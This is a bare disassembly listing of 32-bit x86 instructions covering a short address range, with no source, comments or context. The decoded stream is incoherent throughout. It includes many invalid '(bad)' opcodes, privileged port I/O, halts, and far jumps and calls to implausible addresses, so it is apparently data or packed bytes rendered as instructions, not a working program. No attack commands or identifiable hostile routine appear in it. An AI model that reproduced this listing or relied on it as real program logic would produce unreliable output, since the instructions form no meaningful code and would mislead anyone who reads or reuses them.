  41646e:	mov    dh,0x9f
  416470:	add    edx,DWORD PTR [ebx-0x4e]
  416473:	arpl   WORD PTR [edi-0x18655875],cx
  416479:	push   edx
  41647a:	jb     0x41643d
  41647c:	lahf   
  41647d:	les    esp,FWORD PTR [ecx]
  41647f:	std    
  416480:	lods   eax,DWORD PTR ds:[esi]
  416481:	push   eax
  416482:	sbb    ch,dh
  416484:	(bad)  
  416486:	cmp    DWORD PTR [ebx+0x5b7edd8f],eax
  41648c:	aas    
  41648d:	push   es
  41648e:	ds pop ebx
  416490:	addr16 pop ebx
  416492:	lods   eax,DWORD PTR ds:[esi]
  416493:	idiv   BYTE PTR [esi-0x20910fae]
  416499:	fisttp DWORD PTR [eax]
  41649b:	sub    BYTE PTR [eax],0x4
  41649e:	loope  0x4164ce
  4164a0:	push   ecx
  4164a1:	mov    ebx,0x5d8f5b7e
  4164a6:	shl    esp,cl
  4164a8:	xchg   esi,eax
  4164a9:	push   edx
  4164aa:	push   edx
  4164ab:	arpl   di,di
  4164ad:	xor    dl,BYTE PTR [edi-0x66]
  4164b0:	out    0xdb,eax
	...
  4164da:	add    BYTE PTR [eax],al
  4164dc:	aas    
  4164dd:	pop    ebx
  4164de:	out    0x83,eax
  4164e0:	cdq    
  4164e1:	adc    eax,DWORD PTR [ecx]
  4164e3:	ja     0x4164f1
  4164e5:	cmc    
  4164e6:	std    
  4164e7:	hlt    
  4164e8:	icebp  
  4164e9:	hlt    
  4164ea:	jae    0x4164dd
  4164ec:	cmc    
  4164ed:	xor    esi,DWORD PTR [ecx]
  4164ef:	pop    esi
  4164f0:	in     al,dx
  4164f1:	and    al,bl
  4164f3:	in     eax,dx
  4164f4:	cmp    eax,0xb83d898e
  4164f9:	sbb    ch,bh
  4164fb:	sar    DWORD PTR ds:0x963e5481,cl
  416501:	pop    esp
  416502:	call   0xfe35b854
  416507:	pusha  
  416508:	jbe    0x4164fa
  41650a:	push   0x9b78e2
  41650f:	push   ds
  416510:	jbe    0x41656e
  416512:	call   0xfe367ea4
  416517:	push   cs
  416518:	data16 lock std 
  41651b:	jl     0x416552
  41651d:	cld    
  41651e:	or     eax,0xc7f58cba
  416523:	sub    eax,DWORD PTR [ecx+0x5b]
  416526:	push   ebx
  416527:	bound  eax,QWORD PTR [ecx-0x2b1a3b27]
  41652d:	mov    WORD PTR [edx-0x17],gs
  416530:	repz mov ?,ebp
  416533:	pop    esp
  416534:	or     bh,ah
  416536:	scas   eax,DWORD PTR es:[edi]
  416537:	sbb    ebp,DWORD PTR [edi-0xb]
  41653a:	xchg   DWORD PTR [esi+ecx*4],ebp
  41653d:	loope  0x416572
  41653f:	sldt   WORD PTR [eax]
	...
  41656a:	mov    dl,0x9a
  41656c:	add    BYTE PTR [edx+0x39],ah
  41656f:	sub    DWORD PTR [eax+0x28],ecx
  416572:	cmp    bl,bl
  416574:	cmp    eax,0x689ef1e9
  416579:	sub    dh,bl
  41657b:	call   0xe920:0x266a3e00
  416582:	cmp    eax,0xbb00c060
  416587:	jmp    0xfffd:0x4a85e853
  41658e:	inc    edi
  41658f:	pop    ss
  416590:	(bad)  
  416591:	jmp    DWORD PTR [eax]
  416593:	leave  
  416594:	gs dec edx
  416596:	ins    BYTE PTR es:[edi],dx
  416597:	sbb    dh,bh
  416599:	dec    edi
  41659a:	lock or eax,DWORD PTR [esi]
  41659d:	call   0x400ee3
  4165a2:	call   DWORD PTR [ecx+0x33]
  4165a5:	inc    DWORD PTR [eax]
  4165a7:	xchg   esi,eax
  4165a8:	add    BYTE PTR [esi-0x19],al
  4165ab:	dec    eax
  4165ac:	add    BYTE PTR [ebp+0x2d],dh
  4165af:	and    edx,edi
  4165b1:	xor    edx,DWORD PTR [edi]
  4165b3:	loopne 0x4165b3
  4165b5:	jmp    DWORD PTR [eax]
  4165b7:	mov    ch,bh
  4165b9:	scas   al,BYTE PTR es:[edi]
  4165ba:	pop    edi
  4165bb:	bound  esi,QWORD PTR [ebx-0x45]
  4165be:	xor    BYTE PTR [edx+edi*8],cl
  4165c1:	jmp    FWORD PTR [edx-0xa6c1a11]
  4165c7:	mov    edi,esi
  4165c9:	pop    edi
  4165ca:	shl    DWORD PTR ds:0x4bf,1
	...
  4165f8:	pop    ss
  4165f9:	stos   BYTE PTR es:[edi],al
  4165fa:	mov    ch,ah
  4165fc:	xchg   esp,eax
  4165fd:	mov    ds:0x7f6283f5,eax
  416602:	dec    edx
  416603:	inc    ecx
  416604:	daa    
  416605:	pop    edi
  416606:	jae    0x41660c
  416608:	ficomp WORD PTR [eax+0x5a7f0005]
  41660e:	(bad)  
  41660f:	jmp    edi
  416611:	xchg   esi,eax
  416612:	or     BYTE PTR ds:0x45888bb0,dh
  416618:	mov    bl,0xa3
  41661a:	inc    esp
  41661b:	clc    
  41661c:	fistp  DWORD PTR [ebp+0x0]
  41661f:	add    BYTE PTR [edx+0x19],dl
  416622:	not    BYTE PTR [eax-0x50]
  416625:	or     edx,edi
  416627:	(bad)  
  416628:	ds dec edi
  41662a:	add    bh,bh
  41662c:	dec    ebx
  41662d:	adc    BYTE PTR [ecx+0x14],dl
  416630:	(bad)  
  416631:	sub    eax,0xe7b0ffc1
  416636:	dec    ebp
  416637:	out    0xdd,eax
  416639:	or     DWORD PTR [edx],eax
  41663b:	add    BYTE PTR [ebp+0x3376046c],bh
  416641:	or     al,0x2
  416643:	add    BYTE PTR [ecx+0x1555d9d2],ah
  416649:	ret    
  41664a:	add    edi,edi
  41664c:	or     esp,DWORD PTR [eax-0x73b98bb0]
  416652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416653:	pop    esp
  416654:	jno    0x416687
  416656:	push   eax
  416657:	je     0x4166c3
  416659:	pushf  
  41665a:	pushf  
  41665b:	xor    eax,DWORD PTR [eax]
	...
  416685:	add    BYTE PTR [ecx+0x41],ah
  416688:	cmp    al,cl
  41668a:	inc    esi
  41668b:	add    al,0xb7
  41668d:	mov    ah,BYTE PTR [edx-0x7b]
  416690:	inc    ebp
  416691:	sti    
  416692:	aam    0x3
  416694:	fcom   QWORD PTR [ebp+0x41]
  416697:	(bad)  
  416698:	stc    
  416699:	out    0xb,eax
  41669b:	mov    bl,0x50
  41669d:	inc    bh
  41669f:	mov    dh,0x4d
  4166a1:	addr16 test ebp,ebx
  4166a4:	ret    0x20ff
  4166a7:	addr16 stc 
  4166a9:	out    0x90,eax
  4166ab:	stc    
  4166ac:	dec    ebp
  4166ad:	(bad)  
  4166ae:	adc    DWORD PTR [edi-0x36c01b0],eax
  4166b4:	pop    ecx
  4166b5:	test   DWORD PTR [edi+0x21],0xfffcc84e
  4166bc:	add    DWORD PTR [ebp-0x3b],edx
  4166bf:	pop    ds
  4166c0:	add    bl,0xea
  4166c3:	popf   
  4166c4:	add    al,0x6a
  4166c6:	mov    ecx,eax
  4166c8:	xlat   BYTE PTR ds:[ebx]
  4166c9:	pop    es
  4166ca:	out    0x5a,al
  4166cc:	adc    DWORD PTR ds:0xc970f1d1,0xffffffc5
  4166d3:	and    bh,0x3
  4166d6:	shl    DWORD PTR [eax-0x63db7e01],1
  4166dc:	out    0xdb,eax
  4166de:	ret    0x2885
  4166e1:	add    al,0xa9
  4166e3:	fistp  WORD PTR [bp+di-0x48]
  4166e7:	(bad)  
  4166e8:	outs   dx,BYTE PTR ds:[esi]
  4166e9:	dec    edi
	...
  416712:	add    BYTE PTR [eax],al
  416714:	cwde   
  416715:	arpl   WORD PTR [bx+0xa],cx
  416719:	arpl   WORD PTR [edi-0x6f],cx
  41671c:	dec    esi
  41671d:	repnz push esi
  41671f:	cmp    eax,0xb8e7567f
  416724:	(bad)  
  416725:	(bad)  
  416726:	push   0x48
  416728:	lea    ecx,[eax+0x5ef24e96]
  41672e:	aas    
  41672f:	cld    
  416730:	es repnz cs sti 
  416734:	cdq    
  416735:	addr16 in eax,dx
  416737:	scas   al,BYTE PTR es:[edi]
  416738:	repz and ebp,DWORD PTR [edx]
  41673b:	cld    
  41673c:	dec    ecx
  41673d:	fisubr WORD PTR [ebx+edx*2-0x6b0e0f]
  416744:	and    DWORD PTR [ebx+0x65304ec0],esi
  41674a:	daa    
  41674b:	(bad)  
  41674c:	mov    ebp,0x3e03e894
  416751:	lock je 0x4167a3
  416754:	enter  0xc396,0x34
  416758:	mov    ds:0xe5d8df0f,al
  41675d:	lock pop esp
  41675f:	dec    esp
  416760:	sbb    DWORD PTR [edx],edx
  416762:	sub    ecx,DWORD PTR [edi-0x8]
  416765:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  416767:	xlat   BYTE PTR ds:[ebx]
  416768:	cmp    dl,ah
  41676a:	and    al,0x60
  41676c:	mov    ah,0xeb
  41676e:	add    dl,al
  416770:	shl    ecx,1
  416772:	jae    0x416721
  416774:	jne    0x416765
  416776:	xor    DWORD PTR [esi+0x0],esp
	...
  4167a0:	add    BYTE PTR [eax],al
  4167a2:	and    bl,0x43
  4167a5:	lea    edi,[eax+0x67]
  4167a8:	cld    
  4167a9:	xchg   esi,eax
  4167aa:	out    0x4,al
  4167ac:	(bad)  
  4167ad:	adc    al,0xa
  4167af:	clc    
  4167b0:	and    DWORD PTR [ebp-0xb760f00],edi
  4167b6:	or     DWORD PTR [ebx],eax
  4167b8:	loope  0x4167a3
  4167ba:	cmp    eax,0x742fbd5b
  4167bf:	fwait
  4167c0:	add    BYTE PTR [esi+0x945f8cb],bh
  4167c6:	inc    edx
  4167c7:	pop    ebx
  4167c8:	or     DWORD PTR [ecx],ebp
  4167ca:	imul   ebx,DWORD PTR [edx-0x17],0xc02d09fa
  4167d1:	add    BYTE PTR [eax],0xf1
  4167d4:	std    
  4167d5:	movsx  edi,BYTE PTR ds:[eax]
  4167d9:	out    dx,al
  4167da:	xchg   bh,dh
  4167dc:	out    0x21,eax
  4167de:	cmp    eax,0xed72005b
  4167e3:	ja     0x41679c
  4167e5:	xchg   edx,eax
  4167e6:	xor    al,0x53
  4167e9:	add    DWORD PTR [eax+0x50],eax
  4167ec:	add    cl,ch
  4167ee:	xor    al,0xb0
  4167f0:	jae    0x4167de
  4167f2:	xchg   edx,eax
  4167f3:	stos   BYTE PTR es:[edi],al
  4167f4:	add    cl,ch
  4167f6:	cmp    eax,0xa5f9899b
  4167fb:	addr16 call 0x3fc62c82
  416801:	jmp    0x9475fd1
	...
  41682e:	add    BYTE PTR [eax],al
  416830:	inc    edx
  416831:	pop    ebx
  416832:	or     DWORD PTR [ecx+0x71e756e9],ebp
  416838:	inc    edx
  416839:	pop    ebx
  41683a:	add    BYTE PTR [eax],al
  41683c:	ins    DWORD PTR es:[edi],dx
  41683d:	out    0xc3,eax
  41683f:	add    bh,dl
  416841:	stos   DWORD PTR es:[edi],eax
  416842:	dec    edi
  416843:	jmp    DWORD PTR [edx]
  416845:	(bad)  
  416846:	in     eax,0x3f
  416848:	or     DWORD PTR [eax+eax*1+0xb],ebx
  41684c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41684d:	adc    dh,BYTE PTR [edx-0x77]
  416850:	and    al,BYTE PTR [ebx-0x71408a02]
  416856:	sbb    eax,DWORD PTR [ebx-0x38]
  416859:	popf   
  41685a:	mov    BYTE PTR [ebp-0x39],al
  41685d:	popf   
  41685e:	je     0x416844
  416860:	sub    BYTE PTR [eax],cl
  416862:	fsubp  st(0),st
  416864:	xchg   edi,eax
  416865:	pop    ss
  416866:	(bad)  
  416867:	call   FWORD PTR [ebx+ebx*4+0x10564f71]
  41686e:	loop   0x41686f
  416870:	xor    cl,ah
  416872:	push   0x41
  416874:	xchg   edi,eax
  416875:	outs   dx,BYTE PTR ds:[esi]
  416876:	inc    esp
  416877:	fmul   DWORD PTR [eax]
  416879:	dec    eax
  41687a:	mov    bl,0x6b
  41687c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41687d:	pop    ebx
  41687e:	lea    eax,[ebp+0x53]
  416881:	jo     0x4168c7
  416883:	aam    0xc7
  416885:	jo     0x4168cb
  416887:	in     al,0xb7
  416889:	sahf   
  41688a:	je     0x41686c
  41688c:	das    
  41688d:	mov    bh,0x59
  41688f:	jmp    FWORD PTR [eax]
  416891:	repnz mov ebp,0x74
	...
  4168bb:	add    BYTE PTR [eax],al
  4168bd:	add    BYTE PTR [ecx+0x13],dh
  4168c0:	add    DWORD PTR [eax],eax
  4168c2:	cmp    cl,ah
  4168c4:	(bad)  
  4168c5:	jne    0x4168f6
  4168c7:	xchg   ebx,eax
  4168c8:	ret    0x282f
  4168cb:	mov    al,ds:0xa03f75fe
  4168d0:	je     0x4168da
  4168d2:	aas    
  4168d3:	add    DWORD PTR [esi],ebp
  4168d5:	call   FWORD PTR [eax]
  4168d7:	mov    al,ds:0x5e8e474
  4168dc:	fdivp  st(7),st
  4168de:	ds (bad) 
  4168e0:	cld    
  4168e1:	out    0xde,eax
  4168e3:	in     eax,dx
  4168e4:	dec    esp
  4168e5:	(bad)  
  4168e6:	icebp  
  4168e7:	das    
  4168e8:	fs out 0xef,eax
  4168eb:	repnz dec esp
  4168ed:	inc    BYTE PTR [esp+ecx*2-0x59baf084]
  4168f4:	aad    0x8
  4168f6:	mov    esi,0xc30f01f6
  4168fb:	icebp  
  4168fc:	dec    esp
  4168fd:	inc    cl
  4168ff:	pop    esp
  416900:	add    al,BYTE PTR [eax]
  416902:	test   eax,0x46744c9e
  416907:	int3   
  416908:	test   DWORD PTR [esi],ebp
  41690a:	test   eax,0xa2744c6d
  41690f:	gs (bad) 
  416911:	neg    DWORD PTR [ecx-0x1d180619]
  416917:	inc    ebp
  416918:	dec    ebx
  416919:	dec    BYTE PTR [ecx-0x3c18a1f9]
  41691f:	push   edx
  416920:	dec    ebx
  416921:	inc    BYTE PTR [eax]
	...
  41694b:	add    bl,cl
  41694d:	mov    bh,0x51
  41694f:	dec    edi
  416950:	data16 mov BYTE PTR [ecx],cl
  416953:	jmp    FWORD PTR [ecx-0x77]
  416956:	add    DWORD PTR [edi+0x0],ebx
  416959:	cmp    edi,DWORD PTR [edi]
  41695b:	pop    es
  41695c:	ds (bad) 
  41695e:	js     0x41694b
  416960:	push   ecx
  416961:	iret   
  416962:	std    
  416963:	(bad)  
  416964:	shr    ebx,cl
  416966:	pop    ecx
  416967:	bound  eax,QWORD PTR [eax+0x45]
  41696a:	dec    esp
  41696b:	enter  0xffc,0x2
  41696f:	push   ebp
  416970:	lds    eax,FWORD PTR [edi+0x4c]
  416973:	je     0x4169af
  416975:	dec    esp
  416976:	fs xor eax,0xbff5e521
  41697c:	xchg   edx,eax
  41697d:	and    DWORD PTR [ebp+0x74],ecx
  416980:	cs pop ebx
  416982:	aaa    
  416983:	pop    esp
  416984:	xchg   edx,eax
  416985:	and    eax,0x83714bde
  41698a:	(bad)  [ecx+0x39]
  41698d:	pop    ebx
  41698e:	into   
  41698f:	ror    DWORD PTR [ecx-0x12],1
  416992:	cmp    al,0xf0
  416994:	jns    0x416984
  416996:	xor    al,0xfc
  416998:	fldenv [esi+0x2d84b10]
  41699e:	inc    eax
  41699f:	push   ss
  4169a0:	shr    ebp,1
  4169a2:	mov    al,0x46
  4169a4:	sub    eax,0xd57f345b
  4169a9:	and    bh,0x3
  4169ac:	test   eax,0xa4ffac
	...
  4169d9:	add    BYTE PTR [esp+ebx*4],ah
  4169dc:	out    0x4a,eax
  4169de:	xor    bl,BYTE PTR [edi+0x11]
  4169e1:	out    dx,al
  4169e2:	mov    al,ds:0xe95bdf67
  4169e7:	in     eax,dx
  4169e8:	outs   dx,BYTE PTR ds:[esi]
  4169e9:	dec    ebx
  4169ea:	sbb    DWORD PTR [ebx-0x19],ebx
  4169ed:	pop    edx
  4169ee:	retf   
  4169ef:	or     BYTE PTR [eax+0x565afedf],0xd1
  4169f6:	inc    ebp
  4169f7:	sub    ebx,0x4f62ea4a
  4169fd:	ins    DWORD PTR es:[edi],dx
  4169fe:	push   0x61dc3eed
  416a03:	in     eax,dx
  416a04:	inc    esi
  416a05:	mov    ah,cl
  416a07:	mov    ebx,0xec51c4c2
  416a0c:	pushf  
  416a0d:	not    edi
  416a0f:	cmp    DWORD PTR [esi],ebx
  416a11:	sar    DWORD PTR [ecx],1
  416a13:	add    ebp,DWORD PTR [edx+0x4b]
  416a16:	cmp    ch,ch
  416a18:	and    BYTE PTR [esi+0x39],al
  416a1b:	pop    ebx
  416a1c:	pushf  
  416a1d:	jle    0x416a34
  416a1f:	test   BYTE PTR [edi+ebx*8],dh
  416a22:	jle    0x416a7f
  416a24:	add    BYTE PTR [ecx-0x16c07e4f],al
  416a2a:	test   BYTE PTR [edi+0x10],ah
  416a2d:	out    0x2e,al
  416a2f:	ror    DWORD PTR [eax+0x28],0x3a
  416a33:	add    edx,DWORD PTR [esp+ebx*1]
  416a36:	test   ebp,ebp
  416a38:	or     DWORD PTR [ecx+0x78a15201],ebp
	...
  416a66:	add    BYTE PTR [eax],al
  416a68:	or     BYTE PTR [eax+eax*1-0x29ef142],bl
  416a6f:	cmp    al,0xda
  416a71:	hlt    
  416a72:	sub    DWORD PTR [esi-0x2302127c],0xffffffb2
  416a79:	cmp    DWORD PTR [edi],0x300e65e9
  416a7f:	xchg   esi,eax
  416a80:	add    al,0x23
  416a82:	ret    
  416a83:	fnstsw WORD PTR ds:0xc0958986
  416a89:	sbb    ch,bh
  416a8b:	adc    edi,DWORD PTR [edx]
  416a8d:	adc    DWORD PTR [edi+0x76],0xe9e8546e
  416a94:	xor    al,0xec
  416a96:	std    
  416a97:	jo     0x416b17
  416a99:	lock push 0x9b6609
  416a9f:	rol    DWORD PTR [eax+0x7f],0x3f
  416aa3:	jmp    0x5149d1ac
  416aa8:	fsubr  st,st(4)
  416aaa:	std    
  416aab:	ds hlt 
  416aad:	data16 cld 
  416aaf:	outs   dx,BYTE PTR ss:[esi]
  416ab1:	push   esp
  416ab2:	call   0xfe2d9fbe
  416ab7:	xor    BYTE PTR [ebx],al
  416ab9:	pop    eax
  416aba:	add    BYTE PTR [eax+eax*8-0x7ed27e01],dh
  416ac1:	add    BYTE PTR [eax],0x83
  416ac4:	in     eax,0xec
  416ac6:	jae    0x416ac8
  416ac8:	das    
  416ac9:	nop
  416aca:	(bad)  
  416acb:	add    BYTE PTR cs:[eax],al
	...
  416af6:	and    BYTE PTR [edx+0x11134588],ah
  416afc:	pop    ebp
  416afd:	ins    BYTE PTR es:[edi],dx
  416afe:	out    0x57,al
  416b00:	push   0xfe187345
  416b05:	(bad)  
  416b06:	push   0xffffffef
  416b08:	in     eax,0x65
  416b0a:	adc    BYTE PTR [edx-0x5c750002],ah
  416b10:	(bad)  
  416b11:	jne    0x416b02
  416b13:	(bad)  
  416b14:	in     eax,dx
  416b15:	mov    al,cs:0xebc2c8a1
  416b1b:	push   edi
  416b1c:	push   ebx
  416b1d:	mov    edx,DWORD PTR [ebx+0x2dfcc1d5]
  416b23:	push   edi
  416b24:	push   0x5a
  416b26:	mov    al,ds:0x3be8061b
  416b2b:	push   ecx
  416b2c:	std    
  416b2d:	call   FWORD PTR [esi]
  416b2f:	lods   al,BYTE PTR ds:[esi]
  416b30:	stc    
  416b31:	push   0xffffff97
  416b33:	sets   BYTE PTR [esi+edx*2+0x57]
  416b38:	push   0xfe18437d
  416b3d:	dec    dl
  416b3f:	int    0x45
  416b41:	inc    ecx
  416b42:	xchg   edi,eax
  416b43:	(bad)  
  416b44:	push   edi
  416b45:	xor    al,0xe0
  416b47:	mov    eax,ds:0x9bc00a
  416b4c:	dec    esi
  416b4d:	push   0xbeed5767
  416b52:	pop    esp
  416b54:	imul   eax,DWORD PTR [ecx+0x57],0x75fea7
	...
  416b83:	add    BYTE PTR [edi-0x71],bl
  416b86:	sbb    DWORD PTR [edx+0x20],ebx
  416b89:	mov    ds:0xa26625e5,al
  416b8e:	(bad)  
  416b8f:	push   0x57
  416b91:	sets   BYTE PTR [esi+edi*1-0x4d]
  416b96:	add    DWORD PTR [eax-0x4d],ebp
  416b99:	push   0xf6a1ffc2
  416b9e:	add    DWORD PTR [eax],eax
  416ba0:	mov    esi,0x19341f4c
  416ba5:	repnz cld 
  416ba7:	mov    edi,0x67b20b8a
  416bac:	ds hlt 
  416bae:	pop    eax
  416baf:	mov    ebp,0x40d5d796
  416bb4:	ds and al,0x47
  416bb7:	je     0x416bff
  416bb9:	sbb    al,0x5b
  416bbb:	pop    eax
  416bbc:	jmp    0x2f32c5e2
  416bc1:	test   eax,0x9c3e6948
  416bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bc7:	imul   edi,DWORD PTR [edi-0xc],0xffffffd9
  416bcb:	jl     0x416c27
  416bcd:	xor    eax,DWORD PTR [edi+edi*8]
  416bd0:	or     ecx,DWORD PTR [esi-0x23c1bf47]
  416bd6:	push   esp
  416bd7:	xor    dh,BYTE PTR [ecx+0x32bffcd9]
  416bdd:	sti    
  416bde:	mov    cl,0x67
  416be0:	ds hlt 
  416be2:	pop    eax
  416be3:	mov    ebp,0x40d59f26
	...
  416c10:	add    BYTE PTR [eax],al
  416c12:	ds inc esp
  416c14:	inc    edi
  416c15:	je     0x416c4d
  416c17:	mov    WORD PTR [esi+0x59898158],cs
  416c1d:	mov    ebp,0x6948912e
  416c22:	ds sbb al,0xa4
  416c25:	imul   edi,edi,0xfffffff3
  416c28:	fnstcw WORD PTR [edx+edx*8-0x4e]
  416c2c:	add    DWORD PTR [eax+0x3c],ebp
  416c2f:	hlt    
  416c30:	add    DWORD PTR [eax-0xebcb9a],eax
  416c36:	dec    ecx
  416c37:	pop    ebx
  416c38:	repnz inc ebx
  416c3a:	int    0x43
  416c3c:	mov    bh,0xdb
  416c3e:	cmp    edx,ebp
  416c40:	push   es
  416c41:	mov    DWORD PTR [ecx+0x29c27bb8],ebx
  416c47:	call   0xaa69:0xf339ce06
  416c4e:	sbb    dl,ch
  416c50:	(bad)  
  416c51:	jnp    0x416cb4
  416c53:	jmp    0xd1e6:0xe79247ee
  416c5a:	cmp    ebx,esi
  416c5c:	fstp   QWORD PTR [ecx]
  416c5e:	stc    
  416c5f:	jmp    0x5b7eaf04
  416c64:	xor    al,0x7b
  416c66:	aad    0xdb
  416c68:	stos   DWORD PTR es:[edi],eax
  416c69:	pop    esp
  416c6a:	call   0x431e2b58
  416c6f:	pop    esp
  416c70:	out    0x3,eax
  416c72:	out    0xda,al
  416c74:	test   DWORD PTR [esi+0x0],0x0
	...
  416c9f:	add    al,cl
  416ca1:	shr    DWORD PTR [esp+ebx*2-0x38],cl
  416ca5:	jmp    0xe743e648
  416caa:	aaa    
  416cab:	inc    edi
  416cac:	sub    dl,BYTE PTR [edi-0x72]
  416caf:	rol    DWORD PTR [ecx-0xd],1
  416cb2:	ins    DWORD PTR es:[edi],dx
  416cb3:	call   0x44345659
  416cb8:	dec    eax
  416cb9:	loopne 0x416c9d
  416cbb:	add    al,0x3e
  416cbd:	pop    ebx
  416cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cbf:	rcl    DWORD PTR [ecx+0x3e03e75a],0x22
  416cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cc7:	dec    edi
  416cc8:	js     0x416d2b
  416cca:	out    0x3,eax
  416ccc:	in     al,0x5a
  416cce:	rol    DWORD PTR [ebx],0xd4
  416cd1:	pop    edx
  416cd2:	rol    DWORD PTR [ebx],1
  416cd4:	mov    bl,0x9f
  416cd6:	xor    esi,DWORD PTR [edx+ecx*8+0x13d00df]
  416cdd:	jmp    0x6f4206df
  416ce2:	clc    
  416ce3:	outs   dx,DWORD PTR es:[esi]
  416ce5:	in     eax,0xe8
  416ce7:	shl    DWORD PTR [ecx],0xe9
  416cea:	std    
  416ceb:	loop   0x416d6a
  416ced:	ins    BYTE PTR es:[edi],dx
  416cee:	add    eax,DWORD PTR [eax]
  416cf0:	jo     0x416cda
  416cf2:	std    
  416cf3:	jmp    0xa88a4bfd
  416cf8:	cmp    eax,0x75e573e8
  416cfd:	mov    bl,0x31
  416cff:	out    dx,al
  416d00:	sbb    BYTE PTR [eax+0xb989],0x0
	...
  416d2b:	add    BYTE PTR [eax],al
  416d2d:	add    BYTE PTR [esi-0x7f290b21],al
  416d33:	jmp    0xc3d3a888
  416d38:	xor    esi,ecx
  416d3a:	adc    bl,0x83
  416d3d:	mov    ecx,0xd1fde970
  416d42:	jo     0x416d7d
  416d44:	std    
  416d45:	mov    dh,0xf7
  416d47:	call   0x9c3307b1
  416d4c:	add    BYTE PTR [esi-0x610a0752],ah
  416d52:	add    cl,ch
  416d54:	jae    0x416d37
  416d56:	adc    eax,0x8e32ea
  416d5b:	rol    DWORD PTR [ebx-0x2170f6b],cl
  416d61:	push   0xffffffc6
  416d63:	hlt    
  416d64:	cmc    
  416d65:	jbe    0x416d5f
  416d67:	out    0x71,eax
  416d69:	sbb    ch,BYTE PTR [edx+0x10]
  416d6c:	ins    DWORD PTR es:[edi],dx
  416d6d:	test   al,0x3d
  416d6f:	call   0xe949bb27
  416d74:	std    
  416d75:	inc    ecx
  416d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d77:	sub    eax,0x98ad4efd
  416d7c:	push   0x5f5300
  416d81:	add    BYTE PTR [eax],bl
  416d83:	retf   
  416d84:	in     eax,0xf7
  416d86:	or     BYTE PTR [ecx+0x1f9f8865],ah
  416d8c:	(bad)  
  416d8d:	addr16 daa 
  416d8f:	adc    BYTE PTR [ecx+0x0],al
	...
  416dba:	add    BYTE PTR [eax],al
  416dbc:	iret   
  416dbd:	sub    DWORD PTR [ecx+0x41],0x27
  416dc1:	test   BYTE PTR [edi],bh
  416dc3:	sbb    edx,DWORD PTR [edi]
  416dc5:	pop    esp
  416dc6:	cmp    eax,0x68161614
  416dcc:	daa    
  416dcd:	pop    esp
  416dce:	in     eax,dx
  416dcf:	mov    esi,0x416996bf
  416dd4:	pop    ss
  416dd5:	mov    eax,ds:0x9de0e8b4
  416dda:	(bad)  
  416ddb:	call   DWORD PTR [edx+0x2f6fe5ef]
  416de1:	sahf   
  416de2:	(bad)  
  416de3:	call   0x3ebc77
  416de8:	clc    
  416de9:	pop    ss
  416dea:	push   cs
  416deb:	call   DWORD PTR [edx-0x71]
  416dee:	idiv   bh
  416df0:	mov    BYTE PTR [ebp-0x7e00f78c],bl
  416df6:	sti    
  416df7:	call   FWORD PTR [eax-0x2f0f4b63]
  416dfd:	popf   
  416dfe:	(bad)  
  416dff:	call   0x3ebc6f
  416e04:	mov    eax,0xb8f7e9d7
  416e09:	popf   
  416e0a:	in     eax,0x51
  416e0c:	mov    BYTE PTR [esi-0x689d0002],bl
  416e12:	call   0xfedf861b
  416e17:	jmp    DWORD PTR [edx-0x61]
  416e1a:	in     eax,0x6d
  416e1c:	cmp    al,0x5f
  416e1e:	add    bh,bh
	...
  416e48:	add    BYTE PTR [eax],al
  416e4a:	ds (bad) 
  416e4c:	pop    esp
  416e4d:	imul   BYTE PTR [ecx-0x68]
  416e50:	pop    esp
  416e51:	xor    eax,0xc843a111
  416e56:	jl     0x416e4d
  416e58:	add    DWORD PTR [ebp-0x3b],edx
  416e5b:	popf   
  416e5c:	jg     0x416e21
  416e5e:	dec    edx
  416e5f:	sbb    eax,DWORD PTR [edx]
  416e61:	push   0xffffffe5
  416e63:	inc    eax
  416e64:	int    0x7
  416e66:	es sbb eax,0x7c31ff16
  416e6c:	mov    ebp,0xf9d029fb
  416e71:	addr16 out 0xd0,eax
  416e74:	ret    0x18ff
  416e77:	mov    al,0x97
  416e79:	inc    edi
  416e7a:	jg     0x416e70
  416e7c:	pop    ecx
  416e7d:	lea    ecx,[eax]
  416e7f:	test   BYTE PTR [esi+edi*8-0x75],0xec
  416e84:	fnstcw WORD PTR [eax+0x6804336a]
  416e8a:	cmp    al,0xf4
  416e8c:	add    DWORD PTR [eax-0x1b9672a],eax
  416e92:	loope  0x416e20
  416e94:	add    al,0x0
  416e96:	jmp    0x633a4801
  416e9b:	xor    eax,DWORD PTR [eax+ebp*2]
  416e9e:	inc    eax
  416e9f:	daa    
  416ea0:	sar    edi,0xc0
  416ea3:	inc    edi
  416ea4:	cld    
  416ea5:	out    0x58,eax
  416ea7:	pushf  
  416ea8:	inc    ebx
  416ea9:	(bad)  
  416eaa:	mov    cl,0x47
  416eac:	dec    eax
  416ead:	inc    BYTE PTR [eax]
	...
  416ed7:	add    BYTE PTR [ebx],dh
  416ed9:	cld    
  416eda:	pop    ecx
  416edb:	push   ebx
  416edc:	push   edx
  416edd:	fld    QWORD PTR [eax+ecx*8+0x7c]
  416ee1:	add    BYTE PTR [edx],al
  416ee3:	push   ebp
  416ee4:	(bad)
  416ee7:	ret    
  416ee8:	(bad)  
  416ee9:	ins    DWORD PTR es:[edi],dx
  416eea:	inc    esp
  416eeb:	(bad)  
  416eec:	mov    bl,0x5b
  416eee:	lods   al,BYTE PTR ds:[esi]
  416eef:	inc    edi
  416ef0:	or     esi,esp
  416ef2:	aam    0xf7
  416ef4:	jo     0x416f66
  416ef6:	fistp  WORD PTR [ebx+0x55]
  416ef9:	inc    ecx
  416efa:	out    0x3,eax
  416efc:	xor    eax,0x607ef71b
  416f01:	pop    ecx
  416f02:	out    0x3,eax
  416f04:	jns    0x416ea6
  416f06:	das    
  416f07:	add    edi,DWORD PTR [esi]
  416f09:	pop    ebx
  416f0a:	out    0x3c,eax
  416f0c:	cli    
  416f0d:	out    dx,al
  416f0e:	es cld 
  416f10:	cmp    esi,esp
  416f12:	xchg   ecx,eax
  416f13:	add    esp,DWORD PTR [ebx+ebx*2+0x5b940381]
  416f1a:	pop    esp
  416f1b:	mov    esi,0x7e748b2d
  416f20:	or     eax,0x8143feee
  416f25:	out    0x7c,al
  416f27:	dec    ebx
